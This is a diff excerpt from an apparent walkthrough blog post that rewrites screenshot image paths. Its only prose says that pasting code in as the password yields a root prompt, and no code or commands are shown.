+<img class="alignnone size-full wp-image-482" src="/Sidequests/assets/uploads/2019/12/2019-12-09_14h37_32.png" alt="" width="722" height="436" srcset="/Sidequests/assets/uploads/2019/12/2019-12-09_14h37_32.png 722w, /Sidequests/assets/uploads/2019/12/2019-12-09_14h37_32-300x181.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
 Once you copy and paste the code in for the password, you&#8217;ll be greeted with a root prompt.
 
-<img class="alignnone size-full wp-image-484" src="/assets/uploads/2019/12/2019-12-09_14h43_15.png" alt="" width="722" height="216" srcset="/assets/uploads/2019/12/2019-12-09_14h43_15.png 722w, /assets/uploads/2019/12/2019-12-09_14h43_15-300x90.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
+<img class="alignnone size-full wp-image-484" src="/Sidequests/assets/uploads/2019/12/2019-12-09_14h43_15.png" alt="" width="722" height="216" srcset="/Sidequests/assets/uploads/2019/12/2019-12-09_14h43_15.png 722w, /Sidequests/assets/uploads/2019/12/2019-12-09_14h43_15-300x90.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
 That&#8217;s it!
